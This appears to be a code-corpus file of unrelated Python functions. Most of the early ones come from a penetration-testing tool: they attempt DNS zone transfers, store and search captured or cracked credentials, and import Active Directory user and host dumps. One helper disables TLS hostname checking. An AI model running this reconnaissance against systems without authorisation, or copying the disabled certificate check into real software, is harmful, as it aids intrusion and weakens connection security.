def get_configured_dns ( ) : ips = [ ] try : output = subprocess . check_output ( [ 'nmcli' , 'device' , 'show' ] ) output = output . decode ( 'utf-8' ) for line in output . split ( '\n' ) : if 'DNS' in line : pattern = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" for hit in re . findall ( pattern , line ) : ips . append ( hit ) except FileNotFoundError : pass return ips
def zone_transfer ( address , dns_name ) : ips = [ ] try : print_notification ( "Attempting dns zone transfer for {} on {}" . format ( dns_name , address ) ) z = dns . zone . from_xfr ( dns . query . xfr ( address , dns_name ) ) except dns . exception . FormError : print_notification ( "Zone transfer not allowed" ) return ips names = z . nodes . keys ( ) print_success ( "Zone transfer successfull for {}, found {} entries" . format ( address , len ( names ) ) ) for n in names : node = z [ n ] data = node . get_rdataset ( dns . rdataclass . IN , dns . rdatatype . A ) if data : # TODO add hostnames to entries. # hostname = n.to_text() for item in data . items : address = item . address ips . append ( address ) return ips
def resolve_domains ( domains , disable_zone = False ) : dnsresolver = dns . resolver . Resolver ( ) ips = [ ] for domain in domains : print_notification ( "Resolving {}" . format ( domain ) ) try : result = dnsresolver . query ( domain , 'A' ) for a in result . response . answer [ 0 ] : ips . append ( str ( a ) ) if not disable_zone : ips . extend ( zone_transfer ( str ( a ) , domain ) ) except dns . resolver . NXDOMAIN as e : print_error ( e ) return ips
def create_connection ( conf ) : host_config = { } host_config [ 'hosts' ] = [ conf . get ( 'jackal' , 'host' ) ] if int ( conf . get ( 'jackal' , 'use_ssl' ) ) : host_config [ 'use_ssl' ] = True if conf . get ( 'jackal' , 'ca_certs' ) : host_config [ 'ca_certs' ] = conf . get ( 'jackal' , 'ca_certs' ) if int ( conf . get ( 'jackal' , 'client_certs' ) ) : host_config [ 'client_cert' ] = conf . get ( 'jackal' , 'client_cert' ) host_config [ 'client_key' ] = conf . get ( 'jackal' , 'client_key' ) # Disable hostname checking for now. host_config [ 'ssl_assert_hostname' ] = False connections . create_connection ( * * host_config )
def search ( self , number = None , * args , * * kwargs ) : search = self . create_search ( * args , * * kwargs ) try : if number : response = search [ 0 : number ] else : args , _ = self . core_parser . parse_known_args ( ) if args . number : response = search [ 0 : args . number ] else : response = search . scan ( ) return [ hit for hit in response ] except NotFoundError : print_error ( "The index was not found, have you initialized the index?" ) return [ ] except ( ConnectionError , TransportError ) : print_error ( "Cannot connect to elasticsearch" ) return [ ]
def argument_search ( self ) : arguments , _ = self . argparser . parse_known_args ( ) return self . search ( * * vars ( arguments ) )
def count ( self , * args , * * kwargs ) : search = self . create_search ( * args , * * kwargs ) try : return search . count ( ) except NotFoundError : print_error ( "The index was not found, have you initialized the index?" ) except ( ConnectionError , TransportError ) : print_error ( "Cannot connect to elasticsearch" )
def argument_count ( self ) : arguments , _ = self . argparser . parse_known_args ( ) return self . count ( * * vars ( arguments ) )
def id_to_object ( self , line ) : result = Range . get ( line , ignore = 404 ) if not result : result = Range ( range = line ) result . save ( ) return result
def argparser ( self ) : core_parser = self . core_parser core_parser . add_argument ( '-r' , '--range' , type = str , help = "The range to search for use" ) return core_parser
def object_to_id ( self , obj ) : search = Service . search ( ) search = search . filter ( "term" , address = obj . address ) search = search . filter ( "term" , protocol = obj . protocol ) search = search . filter ( "term" , port = obj . port ) search = search . filter ( "term" , state = obj . state ) if search . count ( ) : result = search [ 0 ] . execute ( ) [ 0 ] return result . meta . id else : return None
def id_to_object ( self , line ) : user = User . get ( line , ignore = 404 ) if not user : user = User ( username = line ) user . save ( ) return user
def get_users ( self , * args , * * kwargs ) : arguments , _ = self . argparser . parse_known_args ( ) if self . is_pipe and self . use_pipe : return self . get_pipe ( self . object_type ) elif arguments . tags or arguments . group or arguments . search or arguments . domain : return self . argument_search ( ) else : return self . search ( * args , * * kwargs )
def get_domains ( self ) : search = User . search ( ) search . aggs . bucket ( 'domains' , 'terms' , field = 'domain' , order = { '_count' : 'desc' } , size = 100 ) response = search . execute ( ) return [ entry . key for entry in response . aggregations . domains . buckets ]
def find_object ( self , username , secret , domain = None , host_ip = None , service_id = None ) : # Not sure yet if this is advisable... Older passwords can be overwritten... search = Credential . search ( ) search = search . filter ( "term" , username = username ) search = search . filter ( "term" , secret = secret ) if domain : search = search . filter ( "term" , domain = domain ) else : search = search . exclude ( "exists" , field = "domain" ) if host_ip : search = search . filter ( "term" , host_ip = host_ip ) else : search = search . exclude ( "exists" , field = "host_ip" ) if service_id : search = search . filter ( "term" , service_id = service_id ) else : search = search . exclude ( "exists" , field = "service_id" ) if search . count ( ) : result = search [ 0 ] . execute ( ) [ 0 ] return result else : return None
def object_to_id ( self , obj ) : # Not sure yet if this is advisable... Older passwords can be overwritten... search = Credential . search ( ) search = search . filter ( "term" , username = obj . username ) search = search . filter ( "term" , secret = obj . secret ) if obj . domain : search = search . filter ( "term" , domain = obj . domain ) else : search = search . exclude ( "exists" , field = "domain" ) if obj . host_ip : search = search . filter ( "term" , host_ip = obj . host_ip ) else : search = search . exclude ( "exists" , field = "host_ip" ) if obj . service_id : search = search . filter ( "term" , service_id = obj . service_id ) else : search = search . exclude ( "exists" , field = "service_id" ) if search . count ( ) : result = search [ 0 ] . execute ( ) [ 0 ] return result . meta . id else : return None
def get_credentials ( self , * args , * * kwargs ) : arguments , _ = self . argparser . parse_known_args ( ) if self . is_pipe and self . use_pipe : return self . get_pipe ( self . object_type ) elif arguments . tags or arguments . type or arguments . search or arguments . password or arguments . cracked or arguments . range or arguments . domain : return self . argument_search ( ) else : return self . search ( * args , * * kwargs )
def commands2tree ( self , adapter , session , commands ) : # todo: trap errors... hdrcmd = commands [ 0 ] commands = commands [ 1 : ] if hdrcmd . name != constants . CMD_SYNCHDR : raise common . InternalError ( 'unexpected first command "%s" (expected "%s")' % ( hdrcmd . name , constants . CMD_SYNCHDR ) ) if hdrcmd . version != constants . SYNCML_VERSION_1_2 : raise common . FeatureNotSupported ( 'unsupported SyncML version "%s"' % ( hdrcmd . version , ) ) xsync = ET . Element ( constants . NODE_SYNCML ) xhdr = ET . SubElement ( xsync , hdrcmd . name ) if hdrcmd . version == constants . SYNCML_VERSION_1_2 : ET . SubElement ( xhdr , 'VerDTD' ) . text = constants . SYNCML_DTD_VERSION_1_2 ET . SubElement ( xhdr , 'VerProto' ) . text = hdrcmd . version ET . SubElement ( xhdr , 'SessionID' ) . text = hdrcmd . sessionID ET . SubElement ( xhdr , 'MsgID' ) . text = hdrcmd . msgID xsrc = ET . SubElement ( xhdr , 'Source' ) ET . SubElement ( xsrc , 'LocURI' ) . text = hdrcmd . source if hdrcmd . sourceName is not None : ET . SubElement ( xsrc , 'LocName' ) . text = hdrcmd . sourceName xtgt = ET . SubElement ( xhdr , 'Target' ) ET . SubElement ( xtgt , 'LocURI' ) . text = hdrcmd . target if hdrcmd . targetName is not None : ET . SubElement ( xtgt , 'LocName' ) . text = hdrcmd . targetName if hdrcmd . respUri is not None : ET . SubElement ( xhdr , 'RespURI' ) . text = hdrcmd . respUri if hdrcmd . auth is not None and not session . authAccepted : if hdrcmd . auth != constants . NAMESPACE_AUTH_BASIC : raise NotImplementedError ( 'auth method "%s"' % ( common . auth2string ( hdrcmd . auth ) , ) ) if hdrcmd . auth == constants . NAMESPACE_AUTH_BASIC : xcred = ET . SubElement ( xhdr , 'Cred' ) xmeta = ET . SubElement ( xcred , 'Meta' ) ET . SubElement ( xmeta , 'Format' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = 'b64' ET . SubElement ( xmeta , 'Type' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = hdrcmd . auth ET . SubElement ( xcred , 'Data' ) . text = base64 . b64encode ( '%s:%s' % ( adapter . peer . username , adapter . peer . password ) ) if hdrcmd . maxMsgSize is not None or hdrcmd . maxObjSize is not None : xmeta = ET . SubElement ( xhdr , 'Meta' ) if hdrcmd . maxMsgSize is not None : ET . SubElement ( xmeta , 'MaxMsgSize' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = hdrcmd . maxMsgSize if hdrcmd . maxObjSize is not None : ET . SubElement ( xmeta , 'MaxObjSize' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = hdrcmd . maxObjSize xbody = ET . SubElement ( xsync , constants . NODE_SYNCBODY ) for cmdidx , cmd in enumerate ( commands ) : xcmd = ET . SubElement ( xbody , cmd . name ) if cmd . cmdID is not None : ET . SubElement ( xcmd , 'CmdID' ) . text = cmd . cmdID if cmd . name == constants . CMD_ALERT : ET . SubElement ( xcmd , 'Data' ) . text = str ( cmd . data ) xitem = ET . SubElement ( xcmd , 'Item' ) ET . SubElement ( ET . SubElement ( xitem , 'Source' ) , 'LocURI' ) . text = cmd . source ET . SubElement ( ET . SubElement ( xitem , 'Target' ) , 'LocURI' ) . text = cmd . target if cmd . lastAnchor is not None or cmd . nextAnchor is not None or cmd . maxObjSize is not None : xmeta = ET . SubElement ( xitem , 'Meta' ) xanch = ET . SubElement ( xmeta , 'Anchor' , { 'xmlns' : constants . NAMESPACE_METINF } ) if cmd . lastAnchor is not None : ET . SubElement ( xanch , 'Last' ) . text = cmd . lastAnchor if cmd . nextAnchor is not None : ET . SubElement ( xanch , 'Next' ) . text = cmd . nextAnchor if cmd . maxObjSize is not None : ET . SubElement ( xmeta , 'MaxObjSize' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = cmd . maxObjSize continue if cmd . name == constants . CMD_STATUS : ET . SubElement ( xcmd , 'MsgRef' ) . text = cmd . msgRef ET . SubElement ( xcmd , 'CmdRef' ) . text = cmd . cmdRef ET . SubElement ( xcmd , 'Cmd' ) . text = cmd . statusOf if cmd . sourceRef is not None : ET . SubElement ( xcmd , 'SourceRef' ) . text = cmd . sourceRef if cmd . targetRef is not None : ET . SubElement ( xcmd , 'TargetRef' ) . text = cmd . targetRef ET . SubElement ( xcmd , 'Data' ) . text = cmd . statusCode if cmd . nextAnchor is not None or cmd . lastAnchor is not None : xdata = ET . SubElement ( ET . SubElement ( xcmd , 'Item' ) , 'Data' ) xanch = ET . SubElement ( xdata , 'Anchor' , { 'xmlns' : constants . NAMESPACE_METINF } ) if cmd . lastAnchor is not None : ET . SubElement ( xanch , 'Last' ) . text = cmd . lastAnchor if cmd . nextAnchor is not None : ET . SubElement ( xanch , 'Next' ) . text = cmd . nextAnchor # NOTE: this is NOT standard SyncML... if cmd . errorCode is not None or cmd . errorMsg is not None : xerr = ET . SubElement ( xcmd , 'Error' ) if cmd . errorCode is not None : ET . SubElement ( xerr , 'Code' ) . text = cmd . errorCode if cmd . errorMsg is not None : ET . SubElement ( xerr , 'Message' ) . text = cmd . errorMsg if cmd . errorTrace is not None : ET . SubElement ( xerr , 'Trace' ) . text = cmd . errorTrace continue if cmd . name in [ constants . CMD_GET , constants . CMD_PUT ] : ET . SubElement ( ET . SubElement ( xcmd , 'Meta' ) , 'Type' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = cmd . type if cmd . source is not None or cmd . target is not None or cmd . data : xitem = ET . SubElement ( xcmd , 'Item' ) if cmd . source is not None : xsrc = ET . SubElement ( xitem , 'Source' ) ET . SubElement ( xsrc , 'LocURI' ) . text = cmd . source ET . SubElement ( xsrc , 'LocName' ) . text = cmd . source if cmd . target is not None : xtgt = ET . SubElement ( xitem , 'Target' ) ET . SubElement ( xtgt , 'LocURI' ) . text = cmd . target ET . SubElement ( xtgt , 'LocName' ) . text = cmd . target if cmd . data is not None : if isinstance ( cmd . data , basestring ) : ET . SubElement ( xitem , 'Data' ) . text = cmd . data else : ET . SubElement ( xitem , 'Data' ) . append ( cmd . data ) continue if cmd . name == constants . CMD_RESULTS : ET . SubElement ( xcmd , 'MsgRef' ) . text = cmd . msgRef ET . SubElement ( xcmd , 'CmdRef' ) . text = cmd . cmdRef ET . SubElement ( ET . SubElement ( xcmd , 'Meta' ) , 'Type' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = cmd . type xitem = ET . SubElement ( xcmd , 'Item' ) xsrc = ET . SubElement ( xitem , 'Source' ) ET . SubElement ( xsrc , 'LocURI' ) . text = cmd . source ET . SubElement ( xsrc , 'LocName' ) . text = cmd . source if cmd . data is not None : if isinstance ( cmd . data , basestring ) : ET . SubElement ( xitem , 'Data' ) . text = cmd . data else : ET . SubElement ( xitem , 'Data' ) . append ( cmd . data ) continue if cmd . name == constants . CMD_SYNC : ET . SubElement ( ET . SubElement ( xcmd , 'Source' ) , 'LocURI' ) . text = cmd . source ET . SubElement ( ET . SubElement ( xcmd , 'Target' ) , 'LocURI' ) . text = cmd . target if cmd . noc is not None : ET . SubElement ( xcmd , 'NumberOfChanges' ) . text = cmd . noc if cmd . data is not None : for scmd in cmd . data : xscmd = ET . SubElement ( xcmd , scmd . name ) if scmd . cmdID is not None : ET . SubElement ( xscmd , 'CmdID' ) . text = scmd . cmdID if scmd . type is not None or ( scmd . format is not None and scmd . format != constants . FORMAT_AUTO ) : xsmeta = ET . SubElement ( xscmd , 'Meta' ) # todo: implement auto encoding determination... #       (the current implementation just lets XML encoding do it, #        which is for most things good enough, but not so good #        for sequences that need a large amount escaping such as #        binary data...) if scmd . format is not None and scmd . format != constants . FORMAT_AUTO : ET . SubElement ( xsmeta , 'Format' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = scmd . format if scmd . type is not None : ET . SubElement ( xsmeta , 'Type' , { 'xmlns' : constants . NAMESPACE_METINF } ) . text = scmd . type xsitem = ET . SubElement ( xscmd , 'Item' ) if scmd . source is not None : ET . SubElement ( ET . SubElement ( xsitem , 'Source' ) , 'LocURI' ) . text = scmd . source if scmd . sourceParent is not None : ET . SubElement ( ET . SubElement ( xsitem , 'SourceParent' ) , 'LocURI' ) . text = scmd . sourceParent if scmd . target is not None : ET . SubElement ( ET . SubElement ( xsitem , 'Target' ) , 'LocURI' ) . text = scmd . target if scmd . targetParent is not None : ET . SubElement ( ET . SubElement ( xsitem , 'TargetParent' ) , 'LocURI' ) . text = scmd . targetParent if scmd . data is not None : if isinstance ( scmd . data , basestring ) : ET . SubElement ( xsitem , 'Data' ) . text = scmd . data else : ET . SubElement ( xsitem , 'Data' ) . append ( scmd . data ) continue if cmd . name == constants . CMD_MAP : ET . SubElement ( ET . SubElement ( xcmd , 'Source' ) , 'LocURI' ) . text = cmd . source ET . SubElement ( ET . SubElement ( xcmd , 'Target' ) , 'LocURI' ) . text = cmd . target if cmd . sourceItem is not None or cmd . targetItem is not None : xitem = ET . SubElement ( xcmd , constants . CMD_MAPITEM ) if cmd . sourceItem is not None : ET . SubElement ( ET . SubElement ( xitem , 'Source' ) , 'LocURI' ) . text = cmd . sourceItem if cmd . targetItem is not None : ET . SubElement ( ET . SubElement ( xitem , 'Target' ) , 'LocURI' ) . text = cmd . targetItem continue if cmd . name == constants . CMD_FINAL : if cmdidx + 1 < len ( commands ) : raise common . InternalError ( 'command "%s" not at tail end of commands' % ( cmd . name , ) ) continue raise common . InternalError ( 'unexpected command "%s"' % ( cmd . name , ) ) return xsync
def tree2commands ( self , adapter , session , lastcmds , xsync ) : # do some preliminary sanity checks... # todo: do i really want to be using assert statements?... assert xsync . tag == constants . NODE_SYNCML assert len ( xsync ) == 2 assert xsync [ 0 ] . tag == constants . CMD_SYNCHDR assert xsync [ 1 ] . tag == constants . NODE_SYNCBODY version = xsync [ 0 ] . findtext ( 'VerProto' ) if version != constants . SYNCML_VERSION_1_2 : raise common . FeatureNotSupported ( 'unsupported SyncML version "%s" (expected "%s")' % ( version , constants . SYNCML_VERSION_1_2 ) ) verdtd = xsync [ 0 ] . findtext ( 'VerDTD' ) if verdtd != constants . SYNCML_DTD_VERSION_1_2 : raise common . FeatureNotSupported ( 'unsupported SyncML DTD version "%s" (expected "%s")' % ( verdtd , constants . SYNCML_DTD_VERSION_1_2 ) ) ret = self . initialize ( adapter , session , xsync ) hdrcmd = ret [ 0 ] if session . isServer : log . debug ( 'received request SyncML message from "%s" (s%s.m%s)' , hdrcmd . target , hdrcmd . sessionID , hdrcmd . msgID ) else : log . debug ( 'received response SyncML message from "%s" (s%s.m%s)' , lastcmds [ 0 ] . target , lastcmds [ 0 ] . sessionID , lastcmds [ 0 ] . msgID ) try : return self . _tree2commands ( adapter , session , lastcmds , xsync , ret ) except Exception , e : if not session . isServer : raise # TODO: make this configurable as to whether or not any error #       is sent back to the peer as a SyncML "standardized" error #       status... code = '%s.%s' % ( e . __class__ . __module__ , e . __class__ . __name__ ) msg = '' . join ( traceback . format_exception_only ( type ( e ) , e ) ) . strip ( ) log . exception ( 'failed while interpreting command tree: %s' , msg ) # TODO: for some reason, the active exception is not being logged... return [ hdrcmd , state . Command ( name = constants . CMD_STATUS , cmdID = '1' , msgRef = session . pendingMsgID , cmdRef = 0 , sourceRef = xsync [ 0 ] . findtext ( 'Source/LocURI' ) , targetRef = xsync [ 0 ] . findtext ( 'Target/LocURI' ) , statusOf = constants . CMD_SYNCHDR , statusCode = constants . STATUS_COMMAND_FAILED , errorCode = code , errorMsg = msg , errorTrace = '' . join ( traceback . format_exception ( type ( e ) , e , sys . exc_info ( ) [ 2 ] ) ) , ) , state . Command ( name = constants . CMD_FINAL ) ]
def parse_single_computer ( entry ) : computer = Computer ( dns_hostname = get_field ( entry , 'dNSHostName' ) , description = get_field ( entry , 'description' ) , os = get_field ( entry , 'operatingSystem' ) , group_id = get_field ( entry , 'primaryGroupID' ) ) try : ip = str ( ipaddress . ip_address ( get_field ( entry , 'IPv4' ) ) ) except ValueError : ip = '' if ip : computer . ip = ip elif computer . dns_hostname : computer . ip = resolve_ip ( computer . dns_hostname ) return computer
def parse_domain_computers ( filename ) : with open ( filename ) as f : data = json . loads ( f . read ( ) ) hs = HostSearch ( ) count = 0 entry_count = 0 print_notification ( "Parsing {} entries" . format ( len ( data ) ) ) for system in data : entry_count += 1 parsed = parse_single_computer ( system ) if parsed . ip : try : host = hs . id_to_object ( parsed . ip ) host . description . append ( parsed . description ) host . hostname . append ( parsed . dns_hostname ) if parsed . os : host . os = parsed . os host . domain_controller = parsed . dc host . add_tag ( 'domaindump' ) host . save ( ) count += 1 except ValueError : pass sys . stdout . write ( '\r' ) sys . stdout . write ( "[{}/{}] {} resolved" . format ( entry_count , len ( data ) , count ) ) sys . stdout . flush ( ) sys . stdout . write ( '\r' ) return count
def parse_user ( entry , domain_groups ) : result = { } distinguished_name = get_field ( entry , 'distinguishedName' ) result [ 'domain' ] = "." . join ( distinguished_name . split ( ',DC=' ) [ 1 : ] ) result [ 'name' ] = get_field ( entry , 'name' ) result [ 'username' ] = get_field ( entry , 'sAMAccountName' ) result [ 'description' ] = get_field ( entry , 'description' ) result [ 'sid' ] = get_field ( entry , 'objectSid' ) . split ( '-' ) [ - 1 ] primary_group = get_field ( entry , 'primaryGroupID' ) member_of = entry [ 'attributes' ] . get ( 'memberOf' , [ ] ) groups = [ ] for member in member_of : for e in member . split ( ',' ) : if e . startswith ( 'CN=' ) : groups . append ( e [ 3 : ] ) groups . append ( domain_groups . get ( primary_group , '' ) ) result [ 'groups' ] = groups flags = [ ] try : uac = int ( get_field ( entry , 'userAccountControl' ) ) for flag , value in uac_flags . items ( ) : if uac & value : flags . append ( flag ) except ValueError : pass result [ 'flags' ] = flags return result
def parse_domain_users ( domain_users_file , domain_groups_file ) : with open ( domain_users_file ) as f : users = json . loads ( f . read ( ) ) domain_groups = { } if domain_groups_file : with open ( domain_groups_file ) as f : groups = json . loads ( f . read ( ) ) for group in groups : sid = get_field ( group , 'objectSid' ) domain_groups [ int ( sid . split ( '-' ) [ - 1 ] ) ] = get_field ( group , 'cn' ) user_search = UserSearch ( ) count = 0 total = len ( users ) print_notification ( "Importing {} users" . format ( total ) ) for entry in users : result = parse_user ( entry , domain_groups ) user = user_search . id_to_object ( result [ 'username' ] ) user . name = result [ 'name' ] user . domain . append ( result [ 'domain' ] ) user . description = result [ 'description' ] user . groups . extend ( result [ 'groups' ] ) user . flags . extend ( result [ 'flags' ] ) user . sid = result [ 'sid' ] user . add_tag ( "domaindump" ) user . save ( ) count += 1 sys . stdout . write ( '\r' ) sys . stdout . write ( "[{}/{}]" . format ( count , total ) ) sys . stdout . flush ( ) sys . stdout . write ( '\r' ) return count
def import_domaindump ( ) : parser = argparse . ArgumentParser ( description = "Imports users, groups and computers result files from the ldapdomaindump tool, will resolve the names from domain_computers output for IPs" ) parser . add_argument ( "files" , nargs = '+' , help = "The domaindump files to import" ) arguments = parser . parse_args ( ) domain_users_file = '' domain_groups_file = '' computer_count = 0 user_count = 0 stats = { } for filename in arguments . files : if filename . endswith ( 'domain_computers.json' ) : print_notification ( 'Parsing domain computers' ) computer_count = parse_domain_computers ( filename ) if computer_count : stats [ 'hosts' ] = computer_count print_success ( "{} hosts imported" . format ( computer_count ) ) elif filename . endswith ( 'domain_users.json' ) : domain_users_file = filename elif filename . endswith ( 'domain_groups.json' ) : domain_groups_file = filename if domain_users_file : print_notification ( "Parsing domain users" ) user_count = parse_domain_users ( domain_users_file , domain_groups_file ) if user_count : print_success ( "{} users imported" . format ( user_count ) ) stats [ 'users' ] = user_count Logger ( ) . log ( "import_domaindump" , 'Imported domaindump, found {} user, {} systems' . format ( user_count , computer_count ) , stats )
def _unicode ( string ) : for encoding in [ 'utf-8' , 'latin1' ] : try : result = unicode ( string , encoding ) return result except UnicodeDecodeError : pass result = unicode ( string , 'utf-8' , 'replace' ) return result
def build_index_and_mapping ( triples ) : ents = bidict ( ) rels = bidict ( ) ent_id = 0 rel_id = 0 collected = [ ] for t in triples : for e in ( t . head , t . tail ) : if e not in ents : ents [ e ] = ent_id ent_id += 1 if t . relation not in rels : rels [ t . relation ] = rel_id rel_id += 1 collected . append ( kgedata . TripleIndex ( ents [ t . head ] , rels [ t . relation ] , ents [ t . tail ] ) ) return collected , ents , rels
def recover_triples_from_mapping ( indexes , ents : bidict , rels : bidict ) : triples = [ ] for t in indexes : triples . append ( kgedata . Triple ( ents . inverse [ t . head ] , rels . inverse [ t . relation ] , ents . inverse [ t . tail ] ) ) return triples
def _transform_triple_numpy ( x ) : return np . array ( [ x . head , x . relation , x . tail ] , dtype = np . int64 )
def pack_triples_numpy ( triples ) : if len ( triples ) == 0 : return np . array ( [ ] , dtype = np . int64 ) return np . stack ( list ( map ( _transform_triple_numpy , triples ) ) , axis = 0 )
def remove_near_duplicate_relation ( triples , threshold = 0.97 ) : logging . debug ( "remove duplicate" ) _assert_threshold ( threshold ) duplicate_rel_counter = defaultdict ( list ) relations = set ( ) for t in triples : duplicate_rel_counter [ t . relation ] . append ( f"{t.head} {t.tail}" ) relations . add ( t . relation ) relations = list ( relations ) num_triples = len ( triples ) removal_relation_set = set ( ) for rel , values in duplicate_rel_counter . items ( ) : duplicate_rel_counter [ rel ] = Superminhash ( values ) for i in relations : for j in relations : if i == j or i in removal_relation_set or j in removal_relation_set : continue close_relations = [ i ] if _set_close_to ( duplicate_rel_counter [ i ] , duplicate_rel_counter [ j ] , threshold ) : close_relations . append ( j ) if len ( close_relations ) > 1 : close_relations . pop ( np . random . randint ( len ( close_relations ) ) ) removal_relation_set |= set ( close_relations ) logging . info ( "Removing {} relations: {}" . format ( len ( removal_relation_set ) , str ( removal_relation_set ) ) ) return list ( filterfalse ( lambda x : x . relation in removal_relation_set , triples ) )
def remove_direct_link_triples ( train , valid , test ) : pairs = set ( ) merged = valid + test for t in merged : pairs . add ( ( t . head , t . tail ) ) filtered = filterfalse ( lambda t : ( t . head , t . tail ) in pairs or ( t . tail , t . head ) in pairs , train ) return list ( filtered )
def shrink_indexes_in_place ( self , triples ) : _ent_roots = self . UnionFind ( self . _ent_id ) _rel_roots = self . UnionFind ( self . _rel_id ) for t in triples : _ent_roots . add ( t . head ) _ent_roots . add ( t . tail ) _rel_roots . add ( t . relation ) for i , t in enumerate ( triples ) : h = _ent_roots . find ( t . head ) r = _rel_roots . find ( t . relation ) t = _ent_roots . find ( t . tail ) triples [ i ] = kgedata . TripleIndex ( h , r , t ) ents = bidict ( ) available_ent_idx = 0 for previous_idx , ent_exist in enumerate ( _ent_roots . roots ( ) ) : if not ent_exist : self . _ents . inverse . pop ( previous_idx ) else : ents [ self . _ents . inverse [ previous_idx ] ] = available_ent_idx available_ent_idx += 1 rels = bidict ( ) available_rel_idx = 0 for previous_idx , rel_exist in enumerate ( _rel_roots . roots ( ) ) : if not rel_exist : self . _rels . inverse . pop ( previous_idx ) else : rels [ self . _rels . inverse [ previous_idx ] ] = available_rel_idx available_rel_idx += 1 self . _ents = ents self . _rels = rels self . _ent_id = available_ent_idx self . _rel_id = available_rel_idx
def freeze ( self ) : data = super ( IndexBuilder , self ) . freeze ( ) try : # Sphinx >= 1.5 format # Due to changes from github.com/sphinx-doc/sphinx/pull/2454 base_file_names = data [ 'docnames' ] except KeyError : # Sphinx < 1.5 format base_file_names = data [ 'filenames' ] store = { } c = itertools . count ( ) for prefix , items in iteritems ( data [ 'objects' ] ) : for name , ( index , typeindex , _ , shortanchor ) in iteritems ( items ) : objtype = data [ 'objtypes' ] [ typeindex ] if objtype . startswith ( 'cpp:' ) : split = name . rsplit ( '::' , 1 ) if len ( split ) != 2 : warnings . warn ( "What's up with %s?" % str ( ( prefix , name , objtype ) ) ) continue prefix , name = split last_prefix = prefix . split ( '::' ) [ - 1 ] else : last_prefix = prefix . split ( '.' ) [ - 1 ] store [ next ( c ) ] = { 'filename' : base_file_names [ index ] , 'objtype' : objtype , 'prefix' : prefix , 'last_prefix' : last_prefix , 'name' : name , 'shortanchor' : shortanchor , } data . update ( { 'store' : store } ) return data
def log_entity_creation ( entity , params = None ) : p = { 'entity' : entity } if params : p [ 'params' ] = params _log ( TYPE_CODES . CREATE , p )
def log_entity_deletion ( entity , params = None ) : p = { 'entity' : entity } if params : p [ 'params' ] = params _log ( TYPE_CODES . DELETE , p )
def log_operation ( entities , operation_name , params = None ) : if isinstance ( entities , ( list , tuple ) ) : entities = list ( entities ) else : entities = [ entities ] p = { 'name' : operation_name , 'on' : entities } if params : p [ 'params' ] = params _log ( TYPE_CODES . OPERATION , p )
def log_state ( entity , state ) : p = { 'on' : entity , 'state' : state } _log ( TYPE_CODES . STATE , p )
def log_update ( entity , update ) : p = { 'on' : entity , 'update' : update } _log ( TYPE_CODES . UPDATE , p )
def format_value ( value ) : value_id = id ( value ) if value_id in recursion_breaker . processed : return u'<recursion>' recursion_breaker . processed . add ( value_id ) try : if isinstance ( value , six . binary_type ) : # suppose, all byte strings are in unicode # don't know if everybody in the world uses anything else? return u"'{0}'" . format ( value . decode ( 'utf-8' ) ) elif isinstance ( value , six . text_type ) : return u"u'{0}'" . format ( value ) elif isinstance ( value , ( list , tuple ) ) : # long lists or lists with multiline items # will be shown vertically values = list ( map ( format_value , value ) ) result = serialize_list ( u'[' , values , delimiter = u',' ) + u']' return force_unicode ( result ) elif isinstance ( value , dict ) : items = six . iteritems ( value ) # format each key/value pair as a text, # calling format_value recursively items = ( tuple ( map ( format_value , item ) ) for item in items ) items = list ( items ) # sort by keys for readability items . sort ( ) # for each item value items = [ serialize_text ( u'{0}: ' . format ( key ) , item_value ) for key , item_value in items ] # and serialize these pieces as a list, enclosing # them into a curve brackets result = serialize_list ( u'{' , items , delimiter = u',' ) + u'}' return force_unicode ( result ) return force_unicode ( repr ( value ) ) finally : recursion_breaker . processed . remove ( value_id )
def traverse ( element , query , deep = False ) : # Grab the next part of the query (it will be chopped from the front each iteration). part = query [ 0 ] if not part : # If the part is blank, we encountered a //, meaning search all sub-nodes. query = query [ 1 : ] part = query [ 0 ] deep = True # Parse out any predicate (tag[pred]) from this part of the query. part , predicate = xpath_re . match ( query [ 0 ] ) . groups ( ) for c in element . _children : if part in ( '*' , c . tagname ) and c . _match ( predicate ) : # A potential matching branch: this child matches the next query part (and predicate). if len ( query ) == 1 : # If this is the last part of the query, we found a matching element, yield it. yield c else : # Otherwise, check the children of this child against the next query part. for e in traverse ( c , query [ 1 : ] ) : yield e if deep : # If we're searching all sub-nodes, traverse with the same query, regardless of matching. # This basically creates a recursion branch to search EVERYWHERE for anything after //. for e in traverse ( c , query , deep = True ) : yield e
def parse_query ( query ) : parts = query . split ( '/' ) norm = [ ] for p in parts : p = p . strip ( ) if p : norm . append ( p ) elif '' not in norm : norm . append ( '' ) return norm
def _match ( self , pred ) : if not pred : return True # Strip off the [ and ] pred = pred [ 1 : - 1 ] if pred . startswith ( '@' ) : # An attribute predicate checks the existence (and optionally value) of an attribute on this tag. pred = pred [ 1 : ] if '=' in pred : attr , value = pred . split ( '=' , 1 ) if value [ 0 ] in ( '"' , "'" ) : value = value [ 1 : ] if value [ - 1 ] in ( '"' , "'" ) : value = value [ : - 1 ] return self . attrs . get ( attr ) == value else : return pred in self . attrs elif num_re . match ( pred ) : # An index predicate checks whether we are the n-th child of our parent (0-based). index = int ( pred ) if index < 0 : if self . parent : # For negative indexes, count from the end of the list. return self . index == ( len ( self . parent . _children ) + index ) else : # If we're the root node, the only index we could be is 0. return index == 0 else : return index == self . index else : if '=' in pred : tag , value = pred . split ( '=' , 1 ) if value [ 0 ] in ( '"' , "'" ) : value = value [ 1 : ] if value [ - 1 ] in ( '"' , "'" ) : value = value [ : - 1 ] for c in self . _children : if c . tagname == tag and c . data == value : return True else : # A plain [tag] predicate means we match if we have a child with tagname "tag". for c in self . _children : if c . tagname == pred : return True return False
def _get_printable_columns ( columns , row ) : if not columns : return row # Extract the column values, in the order specified. return tuple ( row [ c ] for c in columns )
def image_path ( instance , filename ) : filename , ext = os . path . splitext ( filename . lower ( ) ) instance_id_hash = hashlib . md5 ( str ( instance . id ) ) . hexdigest ( ) filename_hash = '' . join ( random . sample ( hashlib . md5 ( filename . encode ( 'utf-8' ) ) . hexdigest ( ) , 8 ) ) return '{}/{}{}' . format ( instance_id_hash , filename_hash , ext )
